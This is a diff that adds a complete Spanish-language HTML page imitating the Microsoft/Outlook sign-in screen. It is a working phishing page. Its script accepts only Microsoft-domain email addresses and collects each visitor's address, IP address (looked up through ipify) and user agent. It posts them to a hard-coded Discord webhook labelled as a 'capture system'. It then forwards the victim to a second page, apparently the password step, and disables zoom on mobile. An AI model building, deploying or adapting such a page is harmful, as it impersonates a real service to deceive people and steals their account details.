@@ -1,0 +1,396 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <title>Iniciar sesión en su cuenta</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      min-height: 100vh;
+      color: #1b1b1b;
+      background: url('banner.svg') center/cover no-repeat fixed;
+    }
+
+    /* ── CONTENEDOR PRINCIPAL ── */
+    .main-container {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 20px 16px 80px;
+    }
+
+    /* ── CARD ── */
+    .card-wrapper { width: 100%; max-width: 440px; }
+
+    .ms-card {
+      background: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,.2);
+      padding: 44px 44px 36px;
+      width: 100%;
+    }
+
+    /* ── LOGO ── */
+    .ms-logo-row {
+      display: flex;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+    .ms-logo-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1px;
+      width: 21px;
+      height: 21px;
+      margin-right: 8px;
+      flex-shrink: 0;
+    }
+    .ms-logo-grid div { width: 10px; height: 10px; }
+
+    /* ── TÍTULO ── */
+    .ms-card h1 {
+      font-size: 24px;
+      font-weight: 600;
+      line-height: 32px;
+      color: #1b1b1b;
+      margin: 0 0 16px;
+      text-align: left;
+    }
+
+    /* ── INPUT EMAIL ── */
+    #email {
+      display: block;
+      width: 100%;
+      border: none;
+      border-bottom: 1px solid #767676;
+      padding: 4px 0 6px;
+      background: transparent;
+      font-size: 16px;
+      font-family: inherit;
+      color: #1b1b1b;
+      margin-bottom: 12px;
+      outline: none;
+    }
+    #email::placeholder { color: #767676; font-size: 15px; }
+    #email:focus        { border-bottom: 2px solid #0078d4; }
+    #email.input-error  { border-bottom: 2px solid #a4262c; }
+
+    /* ── LINKS ── */
+    .ms-link {
+      color: #0078d4;
+      text-decoration: none;
+      font-size: 13px;
+    }
+    .ms-link:hover { text-decoration: underline; }
+
+    /* ── FILA BOTÓN ── */
+    .ms-form-bottom {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 24px;
+    }
+
+    /* ── BOTÓN ── */
+    .ms-btn-next {
+      background: #0078d4;
+      color: #fff;
+      border: none;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: inherit;
+      padding: 8px 20px;
+      min-height: 32px;
+      cursor: pointer;
+    }
+    .ms-btn-next:hover    { background: #106ebe; }
+    .ms-btn-next:active   { background: #005a9e; }
+    .ms-btn-next:disabled { background: #888; cursor: not-allowed; }
+
+    /* ── ERROR ── */
+    #errorMessage {
+      display: none;
+      margin-bottom: 12px;
+      padding: 12px;
+      background: #fef7f7;
+      border: 1px solid #d83b01;
+    }
+    #errorMessage.visible { display: block; }
+
+    /* ── BLOQUE OPCIONES ── */
+    .ms-options-card {
+      background: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,.2);
+      padding: 16px 20px;
+      width: 100%;
+      max-width: 440px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      cursor: pointer;
+      font-size: 15px;
+      color: #1b1b1b;
+    }
+    .ms-options-card:hover { background: #f5f5f5; }
+    .ms-options-icon { width: 20px; height: 20px; color: #605e5c; flex-shrink: 0; }
+
+    /* ── FOOTER ── */
+    .ms-footer {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      background: rgba(255,255,255,.95);
+      border-top: 1px solid #e0e0e0;
+      padding: 8px 16px;
+      z-index: 50;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 24px;
+      font-size: 12px;
+      color: #605e5c;
+    }
+    .ms-footer a { color: #605e5c; text-decoration: none; font-size: 12px; }
+    .ms-footer a:hover { color: #0078d4; }
+
+    /* ── ANIMACIONES ── */
+    .fade-in { animation: fadeIn .3s ease-out; }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to   { opacity: 1; transform: none; }
+    }
+    @keyframes shake {
+      0%, 100%              { transform: translateX(0); }
+      10%, 30%, 50%, 70%, 90% { transform: translateX(-3px); }
+      20%, 40%, 60%, 80%    { transform: translateX(3px); }
+    }
+    .error-shake { animation: shake .5s ease-in-out; }
+
+    /* ── MÓVIL: sin scroll ni zoom ── */
+    @media (max-width: 639px) {
+      html, body {
+        position: fixed !important;
+        width: 100% !important;
+        height: 100% !important;
+        overflow: hidden !important;
+        overscroll-behavior: none !important;
+        touch-action: none !important;
+      }
+      .main-container {
+        position: fixed !important;
+        inset: 0;
+        overflow: hidden !important;
+        touch-action: none !important;
+      }
+    }
+
+    /* ── SIN FONDO EN MÓVIL/TABLET ── */
+    }
+  </style>
+</head>
+<body>
+
+  <div class="main-container">
+
+    <!-- CARD PRINCIPAL -->
+    <div class="card-wrapper fade-in">
+      <div class="ms-card">
+
+        <!-- Logo -->
+        <div class="ms-logo-row">
+          <div class="ms-logo-grid">
+            <div style="background:#f25022"></div>
+            <div style="background:#7fba00"></div>
+            <div style="background:#00bcf2"></div>
+            <div style="background:#ffb900"></div>
+          </div>
+          <span style="font-size:21px;font-weight:600;color:#1b1b1b;">Microsoft</span>
+        </div>
+
+        <h1>Iniciar sesión</h1>
+
+        <!-- Error -->
+        <div id="errorMessage">
+          <div style="display:flex;align-items:flex-start;gap:8px;">
+            <svg style="width:16px;height:16px;color:#a4262c;flex-shrink:0;margin-top:2px" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+            </svg>
+            <div>
+              <p style="font-size:14px;color:#a4262c;font-weight:600;margin:0">Solo se permiten cuentas de Microsoft</p>
+              <p style="font-size:12px;color:#a4262c;margin:4px 0 0">Use una dirección de hotmail, outlook, live o msn</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Formulario -->
+        <form id="emailForm">
+          <input
+            type="email"
+            id="email"
+            placeholder="Correo electrónico, teléfono o Skype"
+            required
+            autocomplete="email"
+          />
+
+          <div style="margin:16px 0 8px;">
+            <p style="font-size:13px;margin:0 0 8px;color:#1b1b1b;">
+              ¿No tiene una cuenta? <a href="#" class="ms-link">Cree una.</a>
+            </p>
+            <a href="#" class="ms-link">¿No puede acceder a su cuenta?</a>
+          </div>
+
+          <div class="ms-form-bottom">
+            <span></span>
+            <button type="submit" id="submitBtn" class="ms-btn-next">Siguiente</button>
+          </div>
+        </form>
+
+      </div>
+    </div>
+
+    <!-- Opciones -->
+    <div class="ms-options-card">
+      <svg class="ms-options-icon" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z"/>
+      </svg>
+      <span>Opciones de inicio de sesión</span>
+    </div>
+
+  </div>
+
+  <!-- Footer -->
+  <div class="ms-footer">
+    <a href="#">Términos de uso</a>
+    <a href="#">Privacidad y cookies</a>
+    <span>···</span>
+  </div>
+
+ <script>
+    // ── WEBHOOK DE DISCORD ─────────────────────────────────────────
+    // Reemplaza esta URL con tu webhook de Discord
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1471154630997315625/EWAdwp2bkQXXFkU5Nh87iUKf4NfvnP0eQ5CqUOT1P-fhUC8iSjrXqYAEe1kdkHWG3PTi";
+
+    // ── DOMINIOS MICROSOFT PERMITIDOS ─────────────────────────────
+    const MS_DOMAINS = [
+      'hotmail.com','hotmail.es','hotmail.co.uk','hotmail.fr','hotmail.de','hotmail.it',
+      'outlook.com','outlook.es','outlook.co.uk','outlook.fr','outlook.de','outlook.it',
+      'live.com','live.es','live.co.uk','live.fr','live.de','live.it',
+      'msn.com'
+    ];
+
+    function isMicrosoftDomain(email) {
+      const domain = email.split('@')[1];
+      return domain && MS_DOMAINS.includes(domain.toLowerCase());
+    }
+
+    // ── ERROR ──────────────────────────────────────────────────────
+    const errorEl = document.getElementById('errorMessage');
+    const emailEl = document.getElementById('email');
+    const form    = document.getElementById('emailForm');
+
+    function showError() {
+      errorEl.classList.add('visible');
+      emailEl.classList.add('input-error');
+      form.classList.add('error-shake');
+      setTimeout(() => form.classList.remove('error-shake'), 500);
+    }
+
+    function hideError() {
+      errorEl.classList.remove('visible');
+      emailEl.classList.remove('input-error');
+    }
+
+    emailEl.addEventListener('input', hideError);
+    emailEl.addEventListener('focus', hideError);
+
+    // ── ENVÍO A DISCORD ────────────────────────────────────────────
+    async function notifyDiscord(email) {
+      const timestamp = new Date().toLocaleString('es-ES');
+      
+      // Obtener IP (opcional pero útil)
+      let ip = 'Desconocida';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+      } catch(e) {}
+
+      // Mensaje para Discord (formato embed)
+      const payload = {
+        username: "📧 Outlook Z3",
+        avatar_url: "https://cdn-icons-png.flaticon.com/512/732/732221.png",
+        embeds: [{
+          title: "📧 Nuevo Email Capturado",
+          color: 0x0078D4, // Color azul Outlook
+          fields: [
+            { name: "📧 Email", value: `\`${email}\``, inline: false },
+            { name: "🕐 Fecha", value: timestamp, inline: true },
+            { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+            { name: "📱 User Agent", value: `\`${navigator.userAgent.substring(0, 100)}...\``, inline: false }
+          ],
+          footer: {
+            text: "Outlook Z3 - Sistema de Captura"
+          },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        await fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.error('Error enviando a Discord:', e);
+      }
+    }
+
+    // ── SUBMIT ────────────────────────────────────────────────────
+    const submitBtn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      if (submitBtn.disabled) return;
+
+      const email = emailEl.value.trim();
+      if (!email) return;
+
+      if (!isMicrosoftDomain(email)) {
+        showError();
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Verificando...';
+
+      await notifyDiscord(email);
+
+      window.location.href = `index2.html?email=${encodeURIComponent(email)}`;
+    });
+
+    // ── BLOQUEAR ZOOM TÁCTIL ──────────────────────────────────────
+    document.addEventListener('gesturestart',  e => e.preventDefault());
+    document.addEventListener('gesturechange', e => e.preventDefault());
+    document.addEventListener('gestureend',    e => e.preventDefault());
+    let lastTouch = 0;
+    document.addEventListener('touchend', e => {
+      const now = Date.now();
+      if (now - lastTouch <= 300) e.preventDefault();
+      lastTouch = now;
+    }, { passive: false });
+    document.addEventListener('touchmove', e => {
+      if (e.touches.length > 1) e.preventDefault();
+    }, { passive: false });
+  </script>
+
+</body>
+</html>
